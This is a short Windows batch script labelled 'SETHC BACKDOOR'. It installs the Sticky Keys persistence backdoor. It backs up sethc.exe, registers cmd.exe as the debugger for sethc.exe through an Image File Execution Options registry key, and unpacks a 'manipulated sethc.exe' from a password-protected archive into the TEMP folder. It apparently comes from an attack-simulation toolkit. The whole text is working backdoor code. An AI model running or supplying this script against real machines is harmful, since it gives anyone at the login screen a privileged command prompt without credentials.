@ECHO OFF

ECHO ===========================================================================
ECHO SETHC BACKDOOR
ECHO Two methods: Replacement of sethc.exe / Debugger registration
ECHO.
ECHO Backing up old sethc.exe
ping -n 5 127.0.0.1 > NUL
COPY %SYSTEMROOT%\System32\sethc.exe %SYSTEMROOT%\System32\sethc.exe.bck

ECHO.
ECHO Trying to replace the real sethc.exe - administrator rights needed
ECHO Instead registering cmd.exe as debugger for sethc.exe
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\Windows\System32\cmd.exe" /f

ECHO At least place a temporary and manipulated sethc.exe in the TEMP folder
"%ZIP%" e -p%PASS% %FILEARCH% -aoa -o"%TEMP%" workfiles\sethc.exe > NUL
